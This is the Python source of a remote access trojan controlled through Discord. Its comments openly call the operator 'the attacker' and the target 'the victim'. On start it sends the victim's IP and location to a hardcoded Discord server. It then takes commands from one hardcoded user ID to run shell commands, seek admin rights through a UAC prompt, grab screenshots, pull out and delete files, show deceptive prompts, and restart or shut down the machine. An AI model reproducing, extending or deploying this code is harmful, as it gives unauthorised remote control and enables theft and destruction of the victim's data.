#A library used to fix an error due to SSL failing to connect due to certificates
import truststore
truststore.inject_into_ssl()

#Imports all the needed libraries
import discord
import os
import sys
import platform
import urllib.request
import json
import mss
import pyautogui as pag
import shutil
import asyncio
import pyuac
import subprocess

token = 'your token here'

#Creating the client using the token from above
intents = discord.Intents.all()
client = discord.Client(intents=intents)

#Executing actions once bot has loaded
@client.event
async def on_ready():
    #Requests basic IP information of the system
    url = urllib.request.urlopen('https://geolocation-db.com/json')
    info = json.loads(url.read().decode())
    flag = info['country_code']
    ip = info['IPv4']

    #Grabs the device information and creates a channel based off the name of the device
    plat = platform.uname()
    global channelname
    channelname = f'session-{plat.node.lower()}'
    cmdguild = client.get_guild(1231254331794391060)
    await cmdguild.create_text_channel(channelname)
    channel = discord.utils.get(cmdguild.text_channels, name=channelname)
    global activechannel
    activechannel = client.get_channel(channel.id)
    await activechannel.send(f'Bot has been started on {plat.system} {plat.release}. Location is :flag_{flag.lower()}:. IP is {ip}.')

#Executes actions when a message is sent
@client.event
async def on_message(message):
    #Ignores messages sent by itself
    if message.author == client.user:
        pass
    #Only allows access to the attacker for malicious commands
    if message.author.id == 250684163303276545:
        #Ensures all sessions do not overlap
        if message.channel.name != channelname:
            pass
        else:
            #Using a match case instead of repeated elif statements for commands
            match message.content:
                #Quits the program
                case '!quit':
                    await activechannel.delete()
                    sys.exit(0)

                #Attempts to gain admin by popping up a UAC prompt
                case '!uac':
                    try:
                        if not pyuac.isUserAdmin():
                            await message.channel.send('Restarting as admin')
                            pyuac.runAsAdmin()
                        else:
                            await message.channel.send('Program has admin')
                    except Exception as e:
                        await message.channel.send(f'An error occurred: {e}')

                #Lists the commands available
                case '!help':
                    await message.channel.send('Commands available:'
                                               '!help - Brings up this message'
                                               '!uac - Attempts to gain admin by prompting the user'
                                               '!cwd - Displays the current working directory'
                                               '!lsfiles - Lists all files in current directory'
                                               '!lsdir - Lists all directories in current directory'
                                               '!screenshot - Takes a screenshot of all available monitors'
                                               '!restart - Restarts the computer'
                                               '!shutdown - Shuts down the computer'
                                               '!cd - Moves to a different directory - !cd /path/to/directory'
                                               '!cp - Copies a file to another directory - !cp /path/to/file and wait for bot ask for destination'
                                               '!delete - Deletes a file - !delete /path/to/file'
                                               '!download - Downloads a file - !download /path/to/file'
                                               '!alert - Pops up an alert on screen - !alert text'
                                               '!prompt - Pops up a prompt on screen - !prompt text'
                                               '!shell - Runs a shell command - !shell command')

                #Shows the attacker the current working directory
                case '!cwd':
                    await message.channel.send(f'Current directory: {os.getcwd()}')

                #Lists all the files in the current directory
                case '!lsfiles':
                    files = []
                    dir = os.scandir(os.getcwd())
                    await message.channel.send(f'Files in: {os.getcwd()}')
                    for item in dir:
                        if item.is_file():
                            files.append(item.name)
                    await message.channel.send('\n'.join(files))

                #Lists all directories in the current directory
                case '!lsdir':
                    folders = []
                    dir = os.scandir(os.getcwd())
                    await message.channel.send(f'Folders in: {os.getcwd()}')
                    for item in dir:
                        if item.is_dir():
                            folders.append(item.name)
                    await message.channel.send('\n'.join(folders))

                #Takes a screenshot of the victims monitor or monitors
                case '!screenshot':
                    with mss.mss() as sc:
                        ss = sc.shot(mon=-1, output='monitors.png')
                    file = discord.File(ss, filename='monitors.png')
                    await message.channel.send(f'Here is the screenshot:', file=file)
                    os.remove('monitors.png')

                #Restarts the victim computer
                case '!restart':
                    await message.channel.send('Restarting computer')
                    await activechannel.delete()
                    os.system('shutdown /r /t 00')

                #Shutsdown the victim computer
                case '!shutdown':
                    await message.channel.send('Shutting down computer')
                    await activechannel.delete()
                    os.system('shutdown /s /t 00')

                #Changes the current working directory
                case cmd if cmd.startswith('!cd'):
                        arg = message.content.split(' ', 1)
                        try:
                            if len(arg) == 2:
                                os.chdir(str(arg[1]))
                                await message.channel.send(f'Moved to {os.getcwd()}')
                            else:
                                await message.channel.send('No argument given')
                        except Exception as e:
                            await message.channel.send(f'An error occurred: {e}')

                #Copies a stated file to a new directory
                case cmd if cmd.startswith('!cp'):
                    arg = message.content.split(' ', 1)
                    try:
                        if len(arg) == 2:
                            input1 = arg[1]
                            await message.channel.send(f'Provide the destination folder and the filename for the copy')
                            try:
                                arg2 = await client.wait_for('message', timeout=20, check= lambda m: m.author == message.author and m.channel == message.channel)
                                input2 = arg2.content
                                await message.channel.send(f'Copying {input1} to {input2}')
                                shutil.copy(input1, input2)
                            except asyncio.TimeoutError:
                                await message.channel.send('Command timed out, try again.')
                    except Exception as e:
                        await message.channel.send(f'An error occurred: {e}')

                #Deletes a selected file
                case cmd if cmd.startswith('!delete'):
                    arg = message.content.split(' ', 1)
                    try:
                        if len(arg) == 2:
                            os.remove(arg[1])
                            await message.channel.send(f'File deleted')
                        else:
                            await message.channel.send('No argument given')
                    except Exception as e:
                        await message.channel.send(f'An error occurred: {e}')

                #Downloads a selected file
                case cmd if cmd.startswith('!download'):
                    arg = message.content.split(' ', 1)
                    try:
                        if len(arg) == 2:
                            file = discord.File(arg[1], filename=message.content[len('!download '):])
                            await message.channel.send('Here is the file:', file=file)
                    except Exception as e:
                        await message.channel.send(f'An error occurred: {e}')

                #Creates an alert on the victim computer
                case cmd if cmd.startswith('!alert'):
                    arg = message.content.split(' ', 1)
                    try:
                        if len(arg) == 2:
                            await message.channel.send('Alert box created')
                            pag.alert(text=arg[1], title='', timeout=10000)
                            await message.channel.send('Alert box closed')
                    except Exception as e:
                        await message.channel.send(f'An error occurred: {e}')

                #Creates a prompt on the victim where they are able to send a message back
                case cmd if cmd.startswith('!prompt'):
                    arg = message.content.split(' ', 1)
                    try:
                        if len(arg) == 2:
                            await message.channel.send('Prompt box created')
                            reply = pag.prompt(text=arg[1], title='')
                            await message.channel.send(f'User responded with: {reply}')
                    except Exception as e:
                        await message.channel.send(f'An error occurred: {e}')

                #Executes a command through the shell
                case cmd if cmd.startswith('!shell'):
                    arg = message.content.split(' ', 1)
                    try:
                        if len(arg) == 2:
                            await message.channel.send('Command is being executed')
                            output = subprocess.run(arg[1], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                            await message.channel.send(output.stdout.decode('cp437'))
                    except Exception as e:
                        await message.channel.send(f'An error occurred: {e}')

    else:
        pass

#Runs the bot
client.run(token)